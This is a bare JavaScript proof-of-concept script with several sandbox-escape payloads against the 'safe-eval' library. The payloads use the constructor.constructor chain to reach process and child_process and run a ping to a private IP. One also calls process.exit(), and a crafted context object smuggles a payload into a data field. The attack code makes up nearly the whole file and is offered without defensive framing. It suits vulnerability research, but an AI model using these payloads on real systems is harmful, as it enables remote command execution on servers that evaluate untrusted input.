var safeEval = require('safe-eval');
input = "this.constructor.constructor('return process')().mainModule.require('child_process').exec('ping -c 4 192.168.45.234')"
// Process is not defined

var context= {world: function () { return child_process.exec("ping -c 4 192.168.45.234")}}
safeEval('{hello: world()}',context)

safeEval("Object.constructor.constructor('return process')().exit()")

code = "ref.id;parts.constructor.constructor('return child_process')().exec('ping -c 4 192.168.45.234')"
context = {"ref":{"id":"55cf687663","name":"Active Item"},"value":null,"parts":[{"type":"text","value":"item"},{"type":"ref","index":"1","value":"id;ref.constructor.constructor('return child_process')().exec('ping -c 4 192.168.45.234')"}],"i":1}
safeEval(code,context)

safeEval("parts.constructor.constructor('return child_process')().exec('ping -c 4 192.168.45.234')", {parts:{}})
